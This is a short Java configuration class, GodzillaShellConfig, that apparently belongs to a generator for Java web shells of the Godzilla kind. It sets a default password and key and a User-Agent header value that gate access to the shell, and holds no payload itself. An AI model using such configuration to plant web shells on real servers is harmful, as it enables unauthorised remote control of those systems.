package com.reajason.javaweb.config;

import com.reajason.javaweb.util.CommonUtil;
import lombok.*;
import lombok.experimental.SuperBuilder;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
@Getter
@SuperBuilder
@NoArgsConstructor
@AllArgsConstructor
@ToString
public class GodzillaShellConfig extends ShellConfig {
    @Builder.Default
    private String pass = "pass";
    @Builder.Default
    private String key = "key";
    @Builder.Default
    private String headerName = "User-Agent";
    @Builder.Default
    private String headerValue = CommonUtil.getRandomString(8);
}
